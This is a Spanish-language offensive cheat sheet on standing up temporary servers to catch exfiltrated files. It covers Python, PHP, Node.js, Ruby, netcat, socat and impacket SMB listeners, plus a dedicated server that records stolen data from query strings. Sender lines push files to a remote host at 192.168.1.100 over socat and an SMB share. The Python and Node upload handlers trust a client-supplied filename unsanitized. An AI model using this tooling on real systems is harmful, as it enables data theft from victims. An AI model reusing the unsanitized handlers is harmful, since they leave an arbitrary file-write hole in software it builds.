# HTTP Catch - Servidores Temporales

Configurar servidores HTTP para recibir archivos exfiltrados o transferencias.

## Python HTTP Server

### Servidor básico

```bash
# Python 3
python3 -m http.server 8000

# Directorio específico
python3 -m http.server 8000 --directory /tmp/share

# Bind específico
python3 -m http.server 8000 --bind 192.168.1.100
```

### Servidor con upload

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

UPLOAD_DIR = '/tmp/uploads'

class UploadHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        
        filename = self.headers.get('X-Filename', 'uploaded_file')
        filepath = os.path.join(UPLOAD_DIR, filename)
        
        with open(filepath, 'wb') as f:
            f.write(data)
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Upload successful')

os.makedirs(UPLOAD_DIR, exist_ok=True)
HTTPServer(('0.0.0.0', 8000), UploadHandler).serve_forever()
```

## PHP Server

### Servidor nativo

```bash
php -S 0.0.0.0:8000
```

### Con upload

```php
<?php
// upload.php
if ($_FILES['file']) {
    $target = '/tmp/uploads/' . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "Uploaded to: $target";
}
?>

<!-- index.html -->
<form enctype="multipart/form-data" method="POST">
    <input type="file" name="file">
    <button>Upload</button>
</form>
```

## Ruby HTTP Server

```bash
# Servidor básico
ruby -run -ehttpd . -p8000

# Con bind específico
ruby -run -ehttpd /tmp/share -p8000 -b 192.168.1.100
```

## Node.js Server

### Servidor simple con express

```javascript
const express = require('express');
const multer = require('multer');
const app = express();

const upload = multer({ dest: '/tmp/uploads/' });

app.post('/upload', upload.single('file'), (req, res) => {
    res.json({ message: 'File uploaded', file: req.file });
});

app.listen(8000, '0.0.0.0');
```

### Servidor sin dependencias

```javascript
const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
        let data = [];
        req.on('data', chunk => data.push(chunk));
        req.on('end', () => {
            const filename = req.headers['x-filename'] || 'upload.bin';
            fs.writeFileSync('/tmp/uploads/' + filename, Buffer.concat(data));
            res.end('OK');
        });
    }
});

server.listen(8000);
```

## Netcat como receptor

```bash
# Recibir archivo
nc -l -p 8000 > received_file

# Con timeout
nc -l -p 8000 -w 60 > received_file

# Múltiples conexiones
while true; do nc -l -p 8000 > received_$(date +%s); done
```

## socat para transferencias

```bash
# Servidor de archivos
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:file.txt,rdonly

# Receptor de archivos
socat TCP-LISTEN:8000,reuseaddr,fork OPEN:received.txt,creat,append

# Cliente envía
socat TCP:192.168.1.100:8000 OPEN:file.txt,rdonly
```

## Impacket smbserver.py

### Compartir archivos vía SMB

```bash
# Servidor SMB anónimo
impacket-smbserver share /tmp/share

# Con autenticación
impacket-smbserver share /tmp/share -user admin -password secret123

# Puerto específico
impacket-smbserver share /tmp/share -port 4455
```

### Cliente Windows

```cmd
:: Conectar
net use \\192.168.1.100\share

:: Copiar archivo
copy file.txt \\192.168.1.100\share\

:: Desconectar
net use \\192.168.1.100\share /delete
```

## Capturar exfiltración de datos

### Servidor para capturar datos

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime

class CatchHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'/tmp/exfil_{timestamp}.bin'
        
        # Guardar path y headers
        with open(filename + '.meta', 'w') as f:
            f.write(f'Path: {self.path}\n')
            for key, value in self.headers.items():
                f.write(f'{key}: {value}\n')
        
        # Guardar query string como datos
        if '?' in self.path:
            data = self.path.split('?', 1)[1]
            with open(filename, 'w') as f:
                f.write(data)
        
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 80), CatchHandler).serve_forever()
```

### DNS catch

```bash
# Con dnsmasq
dnsmasq --no-daemon --log-queries --log-facility=/tmp/dns.log

# Con tcpdump
tcpdump -i eth0 port 53 -w dns_capture.pcap
```

## Resumen

| Herramienta | Puerto | Ventaja |
|-------------|--------|---------|
| Python | 8000 | Disponible en casi todo Linux |
| PHP | 8000 | Común en servidores web |
| Ruby | 8000 | Alternativa rápida |
| Node.js | 8000 | Alto rendimiento |
| Netcat | Any | Raw data |
| socat | Any | Múltiples protocolos |
| impacket | 445 | SMB nativo Windows |
